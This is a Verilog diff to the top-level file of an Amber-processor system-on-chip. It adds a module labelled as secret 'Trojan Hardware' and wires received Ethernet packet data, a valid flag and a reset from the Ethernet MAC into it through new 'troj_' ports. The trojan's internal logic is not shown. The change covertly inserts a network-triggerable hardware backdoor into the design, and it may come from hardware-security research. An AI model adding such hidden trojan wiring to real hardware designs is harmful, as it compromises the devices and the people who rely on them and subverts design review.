@@ -215,6 +215,26 @@ clocks_resets u_clocks_resets (
 
 
 // -------------------------------------------------------------
+// Instatiate Trojan Hardware (shhhh! Secret)
+// -------------------------------------------------------------
+
+// Ethernet RX packet data
+wire [31:0] troj_rx_packet_data;
+wire        troj_rx_packet_data_valid;
+wire        troj_rx_packet_reset;
+
+trojan trojan0 (
+    .i_clk                      (sys_clk),
+    .i_rst                      (sys_rst),
+
+    .i_rx_packet_data           (troj_rx_packet_data),
+    .i_rx_packet_data_valid     (troj_rx_packet_data_valid),
+    .i_rx_packet_reset          (troj_rx_packet_reset)
+);
+
+
+
+// -------------------------------------------------------------
 // Instantiate Amber Processor Core
 // -------------------------------------------------------------
 `ifdef AMBER_A25_CORE
@@ -287,7 +307,12 @@ eth_top u_eth_top (
     .md_padoe_o                 ( md_padoe_o             ),
 
     // Interrupt
-    .int_o                      ( ethmac_int             )
+    .int_o                      ( ethmac_int             ),
+
+    //XXX Trojan signals
+    .troj_rx_packet_data       ( troj_rx_packet_data       ),
+    .troj_rx_packet_data_valid ( troj_rx_packet_data_valid ),
+    .troj_rx_packet_reset      ( troj_rx_packet_reset      )
 );
 
 
